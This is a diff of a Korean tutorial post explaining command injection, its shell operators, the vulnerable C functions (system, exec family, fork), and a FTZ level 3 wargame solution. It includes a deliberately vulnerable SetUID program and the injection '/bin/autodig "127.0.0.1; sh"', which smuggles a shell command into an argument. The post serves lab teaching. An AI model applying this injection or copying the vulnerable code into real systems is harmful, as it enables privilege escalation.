@@ -14,39 +14,41 @@ tag:
 실습 환경 : kali linux, FTZ
 
 ---
+
 Content
 ---
 
 
-1. Command Injection 기법이란?
-1.1. Command Injection 정의	 
-1.2. SetUID, SetGID, Sticky Bit	 
-1.3. Code Injection	 
+1. Command Injection 기법이란?   
+1.1. Command Injection 정의	   
+1.2. SetUID, SetGID, Sticky Bit	   
+1.3. Code Injection	  
 
-2. Command Injection 관련 취약 함수	 
-2.1. System()	 
-2.2. exec 계열 함수	 
-2.3. fork()	 
+2. Command Injection 관련 취약 함수	  
+2.1. System()	   
+2.2. exec 계열 함수	   
+2.3. fork()	   
 
-3. Command Injection 실습	 
-3.1. FTZ level 3	 
+3. Command Injection 실습	   
+3.1. FTZ level 3	   
 
+---
 
 1. Command Injection 기법이란?
 ---
 
-###1.1 Command Injection 정의
+### 1.1 Command Injection 정의
 - Command Injection이란 목표가 취약한 응용 프로그램을 통해 호스트 운영체제에서 임의의 명령을 실행하는 공격으로 주로 웹 어플리케이션이 많이 발전하지 못했던 시절에 특정 데이터를 처리하기 위해서 시스템 명령어를 웹 어플리케이션에서 호출하여 사용하던 것으로 인해서 자주 발생하였다.  
 - 응용프로그램이 안전하지 않은 사용자 제공 데이터 ( 양식, 쿠키, HTTP 헤더 등 )를 시스템 쉘에 전달할 때 가능하며 이를 통해서 악성 스크립트나 파일 등을 업로드하여 공격을 하게 된다.  
 - system, execv, ececle, ececve, ececvp, popen, open, fork 등의 함수에서 사용하며 최근에는 Java ASP, PHP, Nodejs등의 어플리케이션에서 이전의 시스템 명령어를 호출하여 처리하였던 파일, 디렉터리 핸들링이나 타 어플리케이션 호출 등의 기능을 구현하고 있기 때문에 많이 줄어들게 되었다.  
 
-###1.2 SetUID, SetGID, Sticky Bit
+### 1.2 SetUID, SetGID, Sticky Bit
 
 ```
 chmod 1755 stickybit.txt     // -rwxr-xr-t
 chmod 2755 setgid.txt        // -rwxr-sr-x
 chmod 4755 setuid.txt        // -rwsr-xr-x
-[ ex - 권한 설정 ]
+          [ ex - 권한 설정 ]
 ```
 
 - SetUID, SetGID는 파일에 다른 계정이나 그룹의 권한을 임시로 부여하는 개념으로 최신의 리눅스 커널버전에서는 system과 같은 쉘을 실행하는 함수를 실행하기 위해서 알맞은 권한을 획득할 필요가 있다. ( 낮은 수준의 운영체제에서는 자동으로 권한 획득 )  
@@ -63,9 +65,9 @@ chmod 4755 setuid.txt        // -rwsr-xr-x
 ­  한 명령어의 출력을 다른 문맥으로 연결하는 기능을 수행한다.
 
 ```
-­  ` ` : back quote ( back tick )
-­  $( ) : dollar
-­  ex) command1 `command2` : 2의 실행 결과를 1의 인자로 넘김
+­     ` ` : back quote ( back tick )
+­     $( ) : dollar
+­     ex) command1 `command2` : 2의 실행 결과를 1의 인자로 넘김
 
      command1; command2; command3 ...
      => 터미널에서 다수의 명령어를 각각 실행
@@ -74,21 +76,19 @@ chmod 4755 setuid.txt        // -rwsr-xr-x
         실행 가능
      command1 || command2 || command3 ...
      => 다수의 명령어 중 하나라도 성공하면 다음 명령어 수행 X
-[ ex - code injection ( ;, &&, || ) ]
-
+            [ ex - code injection ( ;, &&, || ) ]
 ```
 
 ---
 
 2. Command Injection 관련 취약 함수 분석
 ---
-###2.1. System()
+### 2.1. System()
 
 ```
      #include <stdlib.h>
      int system(const char *string)
-
-[ ex - system 함수 원형 ]
+        [ ex - system 함수 원형 ]
 ```
 
 - /bin/sh -c string 형태로 호출하는 함수로 string에 지정된 명령어를 실행하고 명령어가 끝난 후 반환  
@@ -113,22 +113,22 @@ void main( char* argc, char** argv ) {
 }
 [ ex - soruce code – command_injection.c ]
 
-­  SetUID 설정 chmod 4755 command_injection.c
-­  검증 되지 않은 입력( Untrusted Input )
+­ - SetUID 설정 chmod 4755 command_injection.c
+­ - 검증 되지 않은 입력( Untrusted Input )
 ```
 
-###2.2. exec 계열 함수
+### 2.2. exec 계열 함수
 
 ```
-     #include <unistd.h>
-     int execv  ( const char *path, char *const argv[]);
-     int execve ( const char *path, char *const argv[], char *const envp);
-     int execlp ( const char *file, const char *arg0, ... , const char *argn, (char *)0);
-     int execvp ( const char *file, char *const argv[]);
-     int execl  ( const char *path, const char *arg0, ... , const char *argn, (char *)0);
-     int execle ( const char path, const char *arg0, ... , const char *argn, (char *)0,
-                char *const envp[]);
-[ ex - exec 계열 함수 원형 ]
+#include <unistd.h>
+int execv  ( const char *path, char *const argv[]);
+int execve ( const char *path, char *const argv[], char *const envp);
+int execlp ( const char *file, const char *arg0, ... , const char *argn, (char *)0);
+int execvp ( const char *file, char *const argv[]);
+int execl  ( const char *path, const char *arg0, ... , const char *argn, (char *)0);
+int execle ( const char path, const char *arg0, ... , const char *argn, (char *)0,
+             char *const envp[]);
+                    [ ex - exec 계열 함수 원형 ]
 ```
 
 - exec 계열 함수들은 현재의 프로세스 이미지를 새로운 프로세스 이미지로 덮어쓴다.  
@@ -139,29 +139,35 @@ void main( char* argc, char** argv ) {
 ­ execv( )  
 	- path에 지정한 경로명에 있는 파일 실행하며 argv를 인자로 전달  
 	- argv는 포인터 배열로 마지막에 NULL 문자열을 저장  
+
 ­ execve( )  
 	- execv() 함수와 동일하게 동작하며 추가로 envp 포인터 배열을 인자로 전달  
+
 ­ execlp( )  
 	- file에 지정한 파일을 실행하며 arg0 ~ argn만 인자로 전달  
 	- 파일은 함수를 호출한 프로세스의 검색 경로(환경 변수 PATH에 정의된 경로)에서 탐색  
 	- 함수의 마지막 인자에 NULL 포인터로 지정  
+
 ­ execvp( )  
 	- file에 지정한 파일 실행, argv를 인자로 전달  
 	- 배열의 마지막 인자 NULL 문자열 저장해야 됨  
+
 ­ execl( )   
 	- path에 지정한 경로명의 파일을 실행하며 arg0 ~ argn을 인자로 전달  
 	- 일반적으로 arg0 위치에 실행 파일 명 저장  
-	- 함수의 마지막 인자로 인자의 끝을 의미하는 NULL 포인터((char*)0)을 지정  
+	- 함수의 마지막 인자로 인자의 끝을 의미하는 NULL 포인터((char*)0)을 지정
+
 ­ execle( )  
 	- envp 인자 전달하는 것을 제외하고 execl()과 동일하게 실행 및 인자 전달 수행  
 	- envp는 포인터 배열로 마지막에 NULL 문자를 저장, 새로운 환경 변수 설정 가능  
+
 
 ```
 #include <unistd.h>
 int main() {  
      execl("/bin/sh", "/bin/sh", NULL);
 }
-[ ex - execl 함수 ]
+         [ ex - execl 함수 ]
 ```
 
 ```
@@ -172,15 +178,14 @@ int main(int argc, char **argv)  {
      execle("/bin/sh", "sh", NULL, env);
      perror();
 }
-[ ex - execle 함수 ]
+            [ ex - execle 함수 ]
 ```
 
-###2.3. fork()   
+### 2.3. fork()   
 
 ```
 #include <sys/types.h>
 #include <unistd.h>
-
 pid_t fork(void)
 [ ex – fork 함수 원형 ]
 ```
@@ -192,20 +197,21 @@ pid_t fork(void)
 - pid_t 구조형은 sys/types.h에 속해있고 fork 함수는 unistd에 속함
 
 
-###2.4. 기타 언어의 함수들
+### 2.4. 기타 언어의 함수들
 
 취약한 함수 구분
-Java( Servlet, JSP )
-System.* ( 특히 System.Runtime )
-Perl
-open(), sysopen(), system(), glob()
-PHP
-exec(), system(), passthru(), popen(), require(), include(), eval(), preg_replace()
+- Java( Servlet, JSP )  
+  - System.* ( 특히 System.Runtime )  
+- Perl   
+  - open(), sysopen(), system(), glob()  
+- PHP  
+  - exec(), system(), passthru(), popen(), require(), include(), eval(), preg_replace()  
+
 
 3. Command Injection 실습
 ---
 
-###3.1. FTZ level 3
+### 3.1. FTZ level 3
 
 source code
 ```
@@ -311,14 +317,15 @@ int main(int argc, char **argv){
 0x080484db <main+171>:  nop
 ```
 
-- 공격
-­  문자열이 2개이상 입력되면 안됨
-­ ""를 사용하여 하나의 문자열로 전송
-­ 유닉스 계열에서 연속적인 명령어 전달을 하기 위해서 ; 사용
-­ /bin/autodig "127.0.0.1; sh"
+공격  
+­ - 문자열이 2개이상 입력되면 안됨  
+ - "를 사용하여 하나의 문자열로 전송   
+­ - 유닉스 계열에서 연속적인 명령어 전달을 하기 위해서 ; 사용   
+­ - /bin/autodig "127.0.0.1; sh"  
 
 
 ---
+
 참고문헌
 ---
 
